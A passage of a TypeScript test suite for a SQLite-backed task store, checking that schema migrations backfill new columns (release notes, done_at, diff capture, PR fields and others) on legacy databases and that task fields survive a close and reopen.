	test("open backfills release_version and release_notes on a pre-existing database and they round-trip", async () => {
		const dir = join(root, "legacy-release");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema as it was before the release columns existed.
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]')",
		);
		db.close();
		const store = await open(dir);
		const task = await store.createTask("release me");
		expect(task.releaseVersion).toBeNull();
		expect(task.releaseNotes).toBeNull();
		await store.updateTask(task.id, {
			base: "abc1234",
			releaseVersion: "v0.4.0",
			releaseNotes: "## New features\n- Add the thing.",
		});
		const round = await store.getTask(task.id);
		expect(round?.base).toBe("abc1234");
		expect(round?.releaseVersion).toBe("v0.4.0");
		expect(round?.releaseNotes).toBe("## New features\n- Add the thing.");
		await store.close();
	});
});

describe("done_at", () => {
	test("entering done stamps done_at; other patches never stamp", async () => {
		const store = await open(join(root, "done-clock"));
		const task = await store.createTask("land me");
		expect(task.doneAt).toBeNull();
		await store.updateTask(task.id, { title: "rename only" });
		expect((await store.getTask(task.id))?.doneAt).toBeNull();
		await store.updateTask(task.id, { stage: "done", state: "idle" });
		expect((await store.getTask(task.id))?.doneAt).toBeGreaterThan(0);
		await store.close();
	});

	test("re-entering done overwrites the stamp, like a release card that bounced and re-landed", async () => {
		const store = await open(join(root, "done-reland"));
		const task = await store.createTask("bounce");
		await store.updateTask(task.id, { stage: "done", state: "idle" });
		const first = (await store.getTask(task.id))?.doneAt ?? 0;
		while (Date.now() <= first) {} // a later landing must carry a later stamp
		await store.updateTask(task.id, {
			stage: "in_progress",
			state: "needs_you",
		});
		await store.updateTask(task.id, { stage: "done", state: "idle" });
		expect((await store.getTask(task.id))?.doneAt).toBeGreaterThan(first);
		await store.close();
	});

	test("open migrates a pre-update conflict park reason to the reply-recovery text", async () => {
		const dir = join(root, "conflict-reason-migration");
		const store = await open(dir);
		const t = await store.createTask("conflicted");
		// The park exactly as the shipped OTTR-789 code wrote it.
		await store.updateTask(t.id, {
			stage: "merging",
			state: "needs_you",
			needsReason:
				"PR #7 cannot merge: it conflicts with the target branch. Resolve the conflict on the pull request.",
		});
		// A human-written reason must survive untouched.
		const other = await store.createTask("not a conflict park");
		await store.updateTask(other.id, {
			needsReason: "Resolve the conflict on the pull request.",
		});
		await store.close();
		const reopened = await open(dir);
		expect((await reopened.getTask(t.id))?.needsReason).toBe(
			prConflictReason(7),
		);
		expect((await reopened.getTask(other.id))?.needsReason).toBe(
			"Resolve the conflict on the pull request.",
		);
		// Idempotent: the migrated text no longer matches the migration.
		await reopened.close();
		const again = await open(dir);
		expect((await again.getTask(t.id))?.needsReason).toBe(prConflictReason(7));
	});

	test("open backfills done_at from the last turn's end on a pre-existing database", async () => {
		const dir = join(root, "legacy-done");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema as it was before done_at existed.
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]')",
		);
		db.exec(
			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT)",
		);
		const landedAt = 1790683200000;
		db.run(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('done1', 't', 'p', 'done', 'idle', ?, ?)",
			[landedAt - 3600000, landedAt],
		);
		db.run(
			"INSERT INTO turns (task_id, kind, prompt, started_at, ended_at) VALUES ('done1', 'work', 'p', ?, ?)",
			[landedAt - 3500000, landedAt - 60000],
		);
		db.run(
			"INSERT INTO turns (task_id, kind, prompt, started_at, ended_at) VALUES ('done1', 'merge', 'p', ?, ?)",
			[landedAt - 30000, landedAt],
		);
		db.close();
		const store = await open(dir);
		expect((await store.getTask("done1"))?.doneAt).toBe(landedAt);
		await store.close();
	});

	test("open backfills done_at when a prior migration added the column but stopped before the backfill", async () => {
		const dir = join(root, "interrupted-done-backfill");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema with done_at already present and legacy done rows unstamped: the state
		// after a process stop between the ALTER and the backfill UPDATE.
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', done_at INTEGER)",
		);
		db.exec(
			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT)",
		);
		const landedAt = 1790683200000;
		db.run(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at, done_at) VALUES ('done1', 't', 'p', 'done', 'idle', ?, ?, NULL)",
			[landedAt - 3600000, landedAt],
		);
		db.run(
			"INSERT INTO turns (task_id, kind, prompt, started_at, ended_at) VALUES ('done1', 'work', 'p', ?, ?)",
			[landedAt - 3500000, landedAt - 60000],
		);
		db.run(
			"INSERT INTO turns (task_id, kind, prompt, started_at, ended_at) VALUES ('done1', 'merge', 'p', ?, ?)",
			[landedAt - 30000, landedAt],
		);
		db.close();
		const store = await open(dir);
		expect((await store.getTask("done1"))?.doneAt).toBe(landedAt);
		await store.close();
	});
});

describe("task model", () => {
	test("createTask stores the model and getTask/listTasks return it", async () => {
		const store = await open(join(root, "task-model"));
		const task = await store.createTask("do things", "openai/gpt-5.2");
		expect(task.model).toBe("openai/gpt-5.2");
		expect((await store.getTask(task.id))?.model).toBe("openai/gpt-5.2");
		expect((await store.listTasks()).find((t) => t.id === task.id)?.model).toBe(
			"openai/gpt-5.2",
		);
		expect((await store.createTask("x")).model).toBeNull();
		await store.close();
	});

	test("open backfills tasks.model on a pre-existing database without it", async () => {
		const dir = join(root, "legacy-task-model");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema as it was before the model column existed.
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', release_version TEXT, release_notes TEXT, session_title TEXT, asked TEXT)",
		);
		db.close();
		const store = await open(dir);
		const task = await store.createTask("modeled", "openai/gpt-5");
		expect((await store.getTask(task.id))?.model).toBe("openai/gpt-5");
		await store.close();
	});
});

describe("diff capture columns", () => {
	test("stores stat and text, survives a reopen, defaults null", async () => {
		const store = await open(join(root, "diff-capture"));
		const task = await store.createTask("captured");
		expect(task.diffFiles).toBeNull();
		expect(task.diffText).toBeNull();
		await store.updateTask(task.id, {
			diffFiles: [
				{ file: "src/app.ts", plus: 12, minus: 3 },
				{ file: "logo.png", plus: null, minus: null },
			],
			diffText: "diff --git a/src/app.ts b/src/app.ts\n…",
		});
		const stored = await store.getTask(task.id);
		expect(stored?.diffFiles).toEqual([
			{ file: "src/app.ts", plus: 12, minus: 3 },
			{ file: "logo.png", plus: null, minus: null },
		]);
		expect(stored?.diffText).toContain("diff --git");
		await store.close();
		const reopened = await open(join(root, "diff-capture"));
		expect((await reopened.getTask(task.id))?.diffFiles?.length).toBe(2);
		await reopened.close();
	});

	test("listTasks leaves out the raw diff and matches getTask on every other field", async () => {
		const store = await open(join(root, "diff-list"));
		const task = await store.createTask("listed");
		await store.updateTask(task.id, {
			diffFiles: [{ file: "a.ts", plus: 1, minus: 0 }],
			diffText: "diff --git a/a.ts b/a.ts\n",
			details: "the details",
			report: "the report",
		});
		const [listed] = await store.listTasks();
		const { diffText, ...rest } = (await store.getTask(task.id))!;
		expect(diffText).toBe("diff --git a/a.ts b/a.ts\n");
		expect(listed).not.toHaveProperty("diffText");
		// Strict: a column missing from the list read would show as undefined, not null.
		expect(listed).toStrictEqual(rest);
		await store.close();
	});

	test("a corrupt stored stat list reads as null, not a partial list", async () => {
		const store = await open(join(root, "diff-corrupt"));
		const task = await store.createTask("corrupt");
		await store.updateTask(task.id, { diffFiles: [{ file: 5 }] as never });
		expect((await store.getTask(task.id))?.diffFiles).toBeNull();
		await store.close();
	});

	test("a legacy database without the columns converges on open", async () => {
		const dir = join(root, "diff-legacy");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema as it was before the diff columns existed (pre-feature done card).
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', shots TEXT NOT NULL DEFAULT '[]', release_version TEXT, release_notes TEXT, session_title TEXT, asked TEXT, model TEXT, kept_files TEXT NOT NULL DEFAULT '[]', follow_up_of TEXT, commits INTEGER, done_at INTEGER, push_sha TEXT, report TEXT, research INTEGER NOT NULL DEFAULT 0, update_ids TEXT NOT NULL DEFAULT '[]', update_merge_approved INTEGER NOT NULL DEFAULT 0, topic TEXT, depends_on TEXT NOT NULL DEFAULT '[]')",
		);
		db.exec(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('abc12345', 'old', 'p', 'done', 'idle', 1, 1)",
		);
		db.close();
		const store = await open(dir);
		const task = await store.getTask("abc12345");
		expect(task?.diffFiles).toBeNull();
		expect(task?.diffText).toBeNull();
		await store.close();
	});
});

describe("proposal summary column", () => {
	test("stores the five fields and survives a reopen; fresh rows default null", async () => {
		const store = await open(join(root, "proposal-summary"));
		const task = await store.createTask("held proposal");
		expect(task.proposalSummary).toBeNull();
		await store.updateTask(task.id, {
			proposalSummary: {
				whatChanges: "Add a benchmark script for the merge path.",
				why: "Merge turns re-run the same slow path on every retro.",
				gain: "About 30 seconds per retro run.",
				risk: "none found",
				check: "bun test src/merge-bench.test.ts passes.",
			},
		});
		const stored = await store.getTask(task.id);
		expect(stored?.proposalSummary).toEqual({
			whatChanges: "Add a benchmark script for the merge path.",
			why: "Merge turns re-run the same slow path on every retro.",
			gain: "About 30 seconds per retro run.",
			risk: "none found",
			check: "bun test src/merge-bench.test.ts passes.",
		});
		await store.close();
		const reopened = await open(join(root, "proposal-summary"));
		expect((await reopened.getTask(task.id))?.proposalSummary?.gain).toBe(
			"About 30 seconds per retro run.",
		);
		await reopened.close();
	});

	test("invalid or wrong-shaped proposal_summary JSON reads as null", async () => {
		const store = await open(join(root, "proposal-summary-corrupt"));
		const task = await store.createTask("corrupt summary");
		// Not JSON.
		await store.updateTask(task.id, { proposalSummary: "not json" as never });
		expect((await store.getTask(task.id))?.proposalSummary).toBeNull();
		// JSON but a wrong shape: a missing field drops the whole summary.
		await store.updateTask(task.id, {
			proposalSummary: { whatChanges: "x", why: "y", gain: "z" } as never,
		});
		expect((await store.getTask(task.id))?.proposalSummary).toBeNull();
		// An empty string field also drops the whole summary.
		await store.updateTask(task.id, {
			proposalSummary: {
				whatChanges: "x",
				why: "y",
				gain: "",
				risk: "none found",
				check: "c",
			} as never,
		});
		expect((await store.getTask(task.id))?.proposalSummary).toBeNull();
		await store.close();
	});

	test("a legacy database without the column converges on open and reads null", async () => {
		const dir = join(root, "proposal-summary-legacy");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema as it was before the proposal summary existed (pre-feature done card).
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', shots TEXT NOT NULL DEFAULT '[]', release_version TEXT, release_notes TEXT, session_title TEXT, asked TEXT, model TEXT, kept_files TEXT NOT NULL DEFAULT '[]', follow_up_of TEXT, commits INTEGER, done_at INTEGER, push_sha TEXT, report TEXT, research INTEGER NOT NULL DEFAULT 0, update_ids TEXT NOT NULL DEFAULT '[]', update_merge_approved INTEGER NOT NULL DEFAULT 0, topic TEXT, depends_on TEXT NOT NULL DEFAULT '[]')",
		);
		db.exec(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('abc12345', 'old', 'p', 'done', 'idle', 1, 1)",
		);
		db.close();
		const store = await open(dir);
		const task = await store.getTask("abc12345");
		expect(task?.proposalSummary).toBeNull();
		await store.close();
	});
});

describe("speaker attribution", () => {
	test("pendingBy and turn inputBy persist across a reopen; legacy rows read as null", async () => {
		const dir = join(root, "pending-by");
		const store = await open(dir);
		const task = await store.createTask("hold me");
		expect(task.pendingBy).toBe(null);
		await store.updateTask(task.id, { pendingBy: "supervisor" });
		expect((await store.getTask(task.id))!.pendingBy).toBe("supervisor");
		const turn = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			"the board parked this",
			null,
			"supervisor",
		);
		expect(turn.inputBy).toBe("supervisor");
		await store.updateTask(task.id, { pendingBy: null });
		await store.close();
		const reopened = await open(dir);
		expect((await reopened.getTask(task.id))!.pendingBy).toBe(null);
		expect((await reopened.listTurns(task.id))[0]!.inputBy).toBe("supervisor");
		await reopened.close();
	});
});

describe("keptFiles", () => {
	test("updateTask stores and clears the list; fresh stores default to empty", async () => {
		const store = await open(join(root, "kept"));
		const task = await store.createTask("keep me");
		expect(task.keptFiles).toEqual([]);
		const withFiles = await store.updateTask(task.id, {
			keptFiles: ["out/report.md", "data.log"],
		});
		expect(withFiles.keptFiles).toEqual(["out/report.md", "data.log"]);
		expect((await store.getTask(task.id))?.keptFiles).toEqual([
			"out/report.md",
			"data.log",
		]);
		expect(
			(await store.updateTask(task.id, { keptFiles: [] })).keptFiles,
		).toEqual([]);
		await store.close();
	});

	test("updateTask stores followUpOf and it survives a reopen", async () => {
		const store = await open(join(root, "follow-up-link"));
		const parent = await store.createTask("parent");
		expect(parent.followUpOf).toBe(null);
		const child = await store.createTask("follow up");
		const updated = await store.updateTask(child.id, { followUpOf: parent.id });
		expect(updated.followUpOf).toBe(parent.id);
		// A same-project parent stores no project; a foreign one names it.
		expect(updated.followUpOfProject).toBe(null);
		expect((await store.getTask(child.id))?.followUpOf).toBe(parent.id);
		const foreign = await store.updateTask(child.id, {
			followUpOf: "AGEN-30",
			followUpOfProject: "agent-data",
		});
		expect(foreign.followUpOfProject).toBe("agent-data");
		await store.close();
		const reopened = await open(join(root, "follow-up-link"));
		expect((await reopened.getTask(child.id))?.followUpOf).toBe("AGEN-30");
		expect((await reopened.getTask(child.id))?.followUpOfProject).toBe(
			"agent-data",
		);
		await reopened.close();
	});

	test("updateTask stores dependsOn and it survives a reopen", async () => {
		const store = await open(join(root, "depends-on-link"));
		const parent = await store.createTask("parent");
		expect(parent.dependsOn).toEqual([]);
		const child = await store.createTask("depends on parent");
		const updated = await store.updateTask(child.id, {
			dependsOn: [parent.id],
		});
		expect(updated.dependsOn).toEqual([parent.id]);
		expect((await store.getTask(child.id))?.dependsOn).toEqual([parent.id]);
		await store.close();
		const reopened = await open(join(root, "depends-on-link"));
		expect((await reopened.getTask(child.id))?.dependsOn).toEqual([parent.id]);
		await reopened.close();
	});

	test("updateTask stores pushSha and it survives a reopen", async () => {
		const store = await open(join(root, "push-sha-link"));
		const task = await store.createTask("merge me");
		expect(task.pushSha).toBe(null);
		const updated = await store.updateTask(task.id, { pushSha: "abc12345" });
		expect(updated.pushSha).toBe("abc12345");
		await store.close();
		const reopened = await open(join(root, "push-sha-link"));
		expect((await reopened.getTask(task.id))?.pushSha).toBe("abc12345");
		expect(
			(await reopened.updateTask(task.id, { pushSha: null })).pushSha,
		).toBe(null);
		await reopened.close();
	});

	test("updateTask round-trips the PR-mode fields and they survive a reopen", async () => {
		const store = await open(join(root, "pr-task-fields"));
		const task = await store.createTask("pr me");
		expect(task.prNumber).toBe(null);
		expect(task.prUrl).toBe(null);
		expect(task.prHeadSha).toBe(null);
		expect(task.sourcePrNumber).toBe(null);
		expect(task.sourcePrUrl).toBe(null);
		expect(task.sourcePrHeadRef).toBe(null);
		expect(task.sourcePrHeadSha).toBe(null);
		expect(task.sourcePrCrossRepo).toBe(false);
		expect(task.sourcePrDependabot).toBe(false);
		const updated = await store.updateTask(task.id, {
			prNumber: 7,
			prUrl: "https://github.com/octo/repo/pull/7",
			prHeadSha: "def67890",
			sourcePrNumber: 20,
			sourcePrUrl: "https://github.com/octo/repo/pull/20",
			sourcePrHeadRef: "dependabot/npm_and_yarn/vite-7.1.2",
			sourcePrHeadSha: "abc12300",
			sourcePrCrossRepo: true,
			sourcePrDependabot: true,
		});
		expect(updated.prNumber).toBe(7);
		expect(updated.prUrl).toBe("https://github.com/octo/repo/pull/7");
		expect(updated.prHeadSha).toBe("def67890");
		expect(updated.sourcePrNumber).toBe(20);
		expect(updated.sourcePrUrl).toBe("https://github.com/octo/repo/pull/20");
		expect(updated.sourcePrHeadRef).toBe("dependabot/npm_and_yarn/vite-7.1.2");
		expect(updated.sourcePrHeadSha).toBe("abc12300");
		expect(updated.sourcePrCrossRepo).toBe(true);
		expect(updated.sourcePrDependabot).toBe(true);
		await store.close();
		const reopened = await open(join(root, "pr-task-fields"));
		const back = (await reopened.getTask(task.id))!;
		expect(back.prNumber).toBe(7);
		expect(back.prUrl).toBe("https://github.com/octo/repo/pull/7");
		expect(back.prHeadSha).toBe("def67890");
		expect(back.sourcePrNumber).toBe(20);
		expect(back.sourcePrUrl).toBe("https://github.com/octo/repo/pull/20");
		expect(back.sourcePrHeadRef).toBe("dependabot/npm_and_yarn/vite-7.1.2");
		expect(back.sourcePrHeadSha).toBe("abc12300");
		expect(back.sourcePrCrossRepo).toBe(true);
		expect(back.sourcePrDependabot).toBe(true);
		const cleared = await reopened.updateTask(task.id, {
			prNumber: null,
			prUrl: null,
			prHeadSha: null,
			sourcePrNumber: null,
			sourcePrUrl: null,
			sourcePrHeadRef: null,
			sourcePrHeadSha: null,
			sourcePrCrossRepo: false,
			sourcePrDependabot: false,
		});
		expect(cleared.prNumber).toBe(null);
		expect(cleared.prUrl).toBe(null);
		expect(cleared.prHeadSha).toBe(null);
		expect(cleared.sourcePrNumber).toBe(null);
		expect(cleared.sourcePrUrl).toBe(null);
		expect(cleared.sourcePrHeadRef).toBe(null);
		expect(cleared.sourcePrHeadSha).toBe(null);
		expect(cleared.sourcePrCrossRepo).toBe(false);
		expect(cleared.sourcePrDependabot).toBe(false);
		await reopened.close();
	});

	test("a database from before OTTR-760 converges to the source PR columns", async () => {
		const dir = join(root, "pre-ottr-760-columns");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		// The pre-OTTR-760 shape (the ALTER-only columns absent), as the migration
		// fixture's OLD_TASKS_DDL holds it.
		db.exec(`CREATE TABLE tasks (
			id TEXT PRIMARY KEY,
			title TEXT,
			prompt TEXT,
			stage TEXT NOT NULL CHECK (stage IN ('todo','in_progress','merging','done')),
			state TEXT NOT NULL CHECK (state IN ('queued','running','needs_you','idle')),
			needs_reason TEXT,
			pending_prompt TEXT,
			branch TEXT,
			base TEXT,
			worktree TEXT,
			session_id TEXT,
			summary TEXT,
			details TEXT,
			created_at INTEGER NOT NULL,
			updated_at INTEGER NOT NULL,
			queued_at INTEGER,
			cancelled_at INTEGER,
			images TEXT NOT NULL DEFAULT '[]',
			pending_images TEXT NOT NULL DEFAULT '[]',
			release_version TEXT,
			release_notes TEXT,
			session_title TEXT,
			asked TEXT,
			model TEXT,
			kept_files TEXT NOT NULL DEFAULT '[]',
			follow_up_of TEXT,
			commits INTEGER,
			done_at INTEGER
		)`);
		db.exec(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('t1', 'old', 'p', 'merging', 'idle', 1, 1)",
		);
		db.close();
		const store = await open(dir);
		const back = (await store.getTask("t1"))!;
		expect(back.sourcePrNumber).toBe(null);
		expect(back.sourcePrCrossRepo).toBe(false);
		expect(back.sourcePrDependabot).toBe(false);
		await store.updateTask("t1", {
			sourcePrNumber: 20,
			sourcePrDependabot: true,
		});
		expect((await store.getTask("t1"))!.sourcePrNumber).toBe(20);
		await store.close();
	});

	test("updateTask stores mergeHead and it survives a reopen", async () => {
		const store = await open(join(root, "merge-head-link"));
		const task = await store.createTask("merge me");
		expect(task.mergeHead).toBe(null);
		const updated = await store.updateTask(task.id, { mergeHead: "abc12345" });
		expect(updated.mergeHead).toBe("abc12345");
		await store.close();
		const reopened = await open(join(root, "merge-head-link"));
		expect((await reopened.getTask(task.id))?.mergeHead).toBe("abc12345");
		expect(
			(await reopened.updateTask(task.id, { mergeHead: null })).mergeHead,
		).toBe(null);
		await reopened.close();
	});

	test("updateTask stores research and report and they survive a reopen", async () => {
		const store = await open(join(root, "research-link"));
		const task = await store.createTask("research this");
		expect(task.research).toBe(false);
		expect(task.report).toBe(null);
		const updated = await store.updateTask(task.id, {
			research: true,
			report: "# Findings",
		});
		expect(updated.research).toBe(true);
		expect(updated.report).toBe("# Findings");
		await store.close();
		const reopened = await open(join(root, "research-link"));
		expect((await reopened.getTask(task.id))?.research).toBe(true);
		expect((await reopened.getTask(task.id))?.report).toBe("# Findings");
		await reopened.close();
	});

	test("clearing research survives a reopen and keeps the report", async () => {
		const store = await open(join(root, "research-unmark"));
		const task = await store.createTask("coerced card");
		await store.updateTask(task.id, { research: true, report: "# Findings" });
		const cleared = await store.updateTask(task.id, { research: false });
		expect(cleared.research).toBe(false);
		await store.close();
		const reopened = await open(join(root, "research-unmark"));
		expect((await reopened.getTask(task.id))?.research).toBe(false);
		expect((await reopened.getTask(task.id))?.report).toBe("# Findings");
		await reopened.close();
	});

	test("opening a pre-research database backfills the columns", async () => {
		const dir = join(root, "research-legacy");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		// Schema as it was before report and research existed.
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', release_version TEXT, release_notes TEXT, session_title TEXT, asked TEXT, model TEXT, kept_files TEXT NOT NULL DEFAULT '[]', follow_up_of TEXT)",
		);
		db.run(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('res1', 't', 'p', 'done', 'idle', 1, 1)",
		);
		db.close();
		const store = await open(dir);
		const task = await store.getTask("res1");
		expect(task?.research).toBe(false);
		expect(task?.report).toBe(null);
		expect(task?.steps).toBe("unknown");
		await store.close();
	});

	test("steps round-trips a close and reopen", async () => {
		const store = await open(join(root, "steps-roundtrip"));
		const task = await store.createTask("steps card");
		expect(task.steps).toBe("unknown");
		await store.updateTask(task.id, { steps: "yes" });
		await store.close();
		const reopened = await open(join(root, "steps-roundtrip"));
		expect((await reopened.getTask(task.id))?.steps).toBe("yes");
		await reopened.close();
	});

	test("opening a pre-kept_files database backfills the column", async () => {
		const dir = join(root, "kept-legacy");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		// Schema as it was before kept_files existed.
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', release_version TEXT, release_notes TEXT, session_title TEXT, asked TEXT)",
		);
		db.run(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('kept1', 't', 'p', 'in_progress', 'needs_you', 1, 1)",
		);
		db.close();
		const store = await open(dir);
		expect((await store.getTask("kept1"))?.keptFiles).toEqual([]);
		await store.close();
	});
});

describe("work check log", () => {
	test("a run's warn survives a reopen; rows without one stay warnless", async () => {
		const store = await open(join(root, "wc-log"));
		const task = await store.createTask("checked work");
		await store.updateTask(task.id, {
			workCheckLog: [
				{
					at: 1000,
					model: "zai/glm-5.3-flash:medium",
					outcome: "pass",
					blockers: [],
					notes: [],
					durationMs: 5000,
					warn: "The check model zai/glm-5.3-flash:medium is the same model as the run it checks — no second-model opinion.",
				},
				{
					at: 2000,
					model: "anthropic/claude-opus-5-5",
					outcome: "blockers",
					blockers: [{ finding: "off by one", quote: "i <= n" }],
					notes: ["a note"],
					durationMs: 6000,
				},
			],
		});
		await store.close();
		const reopened = await open(join(root, "wc-log"));
		const log = (await reopened.getTask(task.id))?.workCheckLog ?? [];
		expect(log).toHaveLength(2);
		expect(log[0]?.warn).toBe(
			"The check model zai/glm-5.3-flash:medium is the same model as the run it checks — no second-model opinion.",
		);
		expect(log[1]?.warn).toBeUndefined();
		await reopened.close();
	});
});

describe("uncommittedFiles", () => {
	test("updateTask stores and clears the list; fresh stores default to empty", async () => {
		const store = await open(join(root, "uncommitted"));
		const task = await store.createTask("capture me");
		expect(task.uncommittedFiles).toEqual([]);
		const withFiles = await store.updateTask(task.id, {
			uncommittedFiles: ["research-report.md", "scratch.txt"],
		});
		expect(withFiles.uncommittedFiles).toEqual([
			"research-report.md",
			"scratch.txt",
		]);
		expect((await store.getTask(task.id))?.uncommittedFiles).toEqual([
			"research-report.md",
			"scratch.txt",
		]);
		expect(
			(await store.updateTask(task.id, { uncommittedFiles: [] }))
				.uncommittedFiles,
		).toEqual([]);
		await store.close();
	});

	test("opening a pre-uncommitted_files database backfills the column", async () => {
		const dir = join(root, "uncommitted-legacy");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		// Schema as it was before uncommitted_files existed.
		db.exec(
			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', release_version TEXT, release_notes TEXT, session_title TEXT, asked TEXT, model TEXT, kept_files TEXT NOT NULL DEFAULT '[]')",
		);
		db.run(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('wt1', 't', 'p', 'done', 'idle', 1, 1)",
		);
		db.close();
		const store = await open(dir);
		expect((await store.getTask("wt1"))?.uncommittedFiles).toEqual([]);
		await store.close();
	});
});

describe("events", () => {
	test("createTask records a create event and the initial queued state", async () => {
		const store = await open(join(root, "stats-create"));
		const task = await store.createTask("count me");
		const events = await store.events();
		expect(events.map((e) => [e.kind, e.taskId, e.to])).toEqual([
			["create", task.id, "todo"],
			["state", task.id, "queued"],
		]);
		await store.close();
	});

	test("stage and state transitions record from/to; unchanged or same-value patches record nothing", async () => {
		const store = await open(join(root, "stats-transitions"));
		const task = await store.createTask("move me");
		await store.updateTask(task.id, { state: "running", stage: "in_progress" });
		await store.updateTask(task.id, { state: "needs_you", needsReason: "ask" });
		await store.updateTask(task.id, { state: "queued", pendingPrompt: "." });
		expect(
			(await store.events())
